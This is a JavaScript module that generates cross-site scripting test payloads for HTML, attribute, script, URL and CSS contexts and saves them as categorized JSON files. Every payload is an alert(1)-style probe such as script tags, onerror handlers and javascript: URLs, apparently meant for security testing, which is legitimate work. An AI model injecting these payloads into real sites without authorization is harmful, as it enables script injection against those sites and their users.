const fs = require('fs');
const path = require('path');

/**
 * Context types for XSS payloads
 */
const CONTEXT_TYPES = {
    HTML: 'html',
    ATTRIBUTE: 'attribute',
    JS: 'javascript',
    URL: 'url',
    CSS: 'css'
};

/**
 * Attribute types for attribute context
 */
const ATTRIBUTE_TYPES = {
    UNQUOTED: 'unquoted',
    SINGLE_QUOTED: 'single-quoted',
    DOUBLE_QUOTED: 'double-quoted',
    EVENT_HANDLER: 'event-handler'
};

/**
 * Templates for different contexts
 */
const TEMPLATES = {
    [CONTEXT_TYPES.HTML]: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>'
    ],
    [CONTEXT_TYPES.ATTRIBUTE]: {
        [ATTRIBUTE_TYPES.UNQUOTED]: [
            '" onmouseover="alert(1)',
            '" onclick="alert(1)',
            '" onerror="alert(1)',
            ' onmouseover=alert(1) ',
            ' onclick=alert(1) ',
            ' onerror=alert(1) '
        ],
        [ATTRIBUTE_TYPES.SINGLE_QUOTED]: [
            "' onmouseover='alert(1)",
            "' onclick='alert(1)",
            "' onerror='alert(1)",
            "' onmouseover=alert(1) '",
            "' onclick=alert(1) '",
            "' onerror=alert(1) '"
        ],
        [ATTRIBUTE_TYPES.DOUBLE_QUOTED]: [
            '" onmouseover="alert(1)',
            '" onclick="alert(1)',
            '" onerror="alert(1)',
            '" onmouseover=alert(1) "',
            '" onclick=alert(1) "',
            '" onerror=alert(1) "'
        ],
        [ATTRIBUTE_TYPES.EVENT_HANDLER]: [
            'alert(1)',
            'javascript:alert(1)',
            '`;alert(1);`',
            '";alert(1);"',
            "';alert(1);'"
        ]
    },
    [CONTEXT_TYPES.JS]: [
        '";alert(1);//',
        "';alert(1);//",
        '`+alert(1)+`',
        '\\";alert(1);//',
        "\\'alert(1);//",
        '</script><script>alert(1)</script>',
        'alert(1)',
        '(alert)(1)',
        'eval("alert(1)")',
        'Function("alert(1)")()'
    ],
    [CONTEXT_TYPES.URL]: [
        'javascript:alert(1)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:,alert(1)',
        'data:text/html,<script>alert(1)</script>'
    ],
    [CONTEXT_TYPES.CSS]: [
        '</style><script>alert(1)</script>',
        'expression(alert(1))',
        'url(javascript:alert(1))',
        '};alert(1);{'
    ]
};

/**
 * Generates payloads for a specific context
 * @param {string} context - The context type (html, attribute, javascript, url, css)
 * @param {Object} options - Options for payload generation
 * @param {string} options.attributeType - Type of attribute for attribute context
 * @param {string} options.prefix - Prefix to add to each payload
 * @param {string} options.suffix - Suffix to add to each payload
 * @param {boolean} options.encode - Whether to URL-encode the payloads
 * @param {number} options.alertValue - Value to use in alert() calls
 * @returns {Array} - Array of generated payloads
 */
function generatePayloads(context, options = {}) {
    const {
        attributeType = ATTRIBUTE_TYPES.UNQUOTED,
        prefix = '',
        suffix = '',
        encode = false,
        alertValue = 1
    } = options;
    
    let templates = [];
    
    // Get templates based on context
    if (context === CONTEXT_TYPES.ATTRIBUTE) {
        templates = TEMPLATES[context][attributeType] || [];
    } else {
        templates = TEMPLATES[context] || [];
    }
    
    // Replace alert value if different from default
    if (alertValue !== 1) {
        templates = templates.map(t => t.replace(/alert\(1\)/g, `alert(${alertValue})`));
    }
    
    // Add prefix and suffix
    let payloads = templates.map(t => `${prefix}${t}${suffix}`);
    
    // URL-encode if requested
    if (encode) {
        payloads = payloads.map(p => encodeURIComponent(p));
    }
    
    return payloads;
}

/**
 * Saves generated payloads to a JSON file
 * @param {Array} payloads - Array of payloads to save
 * @param {string} filename - Name of the file to save to (without extension)
 * @returns {string} - Path to the saved file
 */
function savePayloads(payloads, filename) {
    const filePath = path.join(__dirname, `${filename}.json`);
    fs.writeFileSync(filePath, JSON.stringify(payloads, null, 2));
    return filePath;
}

/**
 * Generates payloads for multiple contexts and combines them
 * @param {Array} contexts - Array of context objects
 * @param {string} contexts[].type - Context type
 * @param {Object} contexts[].options - Options for this context
 * @returns {Array} - Combined array of payloads
 */
function generateMultiContextPayloads(contexts) {
    let allPayloads = [];
    
    for (const context of contexts) {
        const payloads = generatePayloads(context.type, context.options);
        allPayloads = allPayloads.concat(payloads);
    }
    
    return allPayloads;
}

/**
 * Creates a categorized payload file with payloads for different contexts
 * @param {string} filename - Name of the file to save to (without extension)
 * @returns {string} - Path to the saved file
 */
function createCategorizedPayloadFile(filename) {
    const categorized = [
        {
            category: "HTML_Context",
            description: "Payloads for HTML context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.HTML)
        },
        {
            category: "Unquoted_Attribute",
            description: "Payloads for unquoted attribute context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.ATTRIBUTE, { attributeType: ATTRIBUTE_TYPES.UNQUOTED })
        },
        {
            category: "Single_Quoted_Attribute",
            description: "Payloads for single-quoted attribute context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.ATTRIBUTE, { attributeType: ATTRIBUTE_TYPES.SINGLE_QUOTED })
        },
        {
            category: "Double_Quoted_Attribute",
            description: "Payloads for double-quoted attribute context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.ATTRIBUTE, { attributeType: ATTRIBUTE_TYPES.DOUBLE_QUOTED })
        },
        {
            category: "Event_Handler",
            description: "Payloads for event handler attribute context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.ATTRIBUTE, { attributeType: ATTRIBUTE_TYPES.EVENT_HANDLER })
        },
        {
            category: "JavaScript_Context",
            description: "Payloads for JavaScript context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.JS)
        },
        {
            category: "URL_Context",
            description: "Payloads for URL context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.URL)
        },
        {
            category: "CSS_Context",
            description: "Payloads for CSS context",
            browser_compatibility: ["chromium", "firefox", "webkit"],
            payloads: generatePayloads(CONTEXT_TYPES.CSS)
        }
    ];
    
    const filePath = path.join(__dirname, `${filename}.json`);
    fs.writeFileSync(filePath, JSON.stringify(categorized, null, 2));
    return filePath;
}

module.exports = {
    CONTEXT_TYPES,
    ATTRIBUTE_TYPES,
    generatePayloads,
    savePayloads,
    generateMultiContextPayloads,
    createCategorizedPayloadFile
};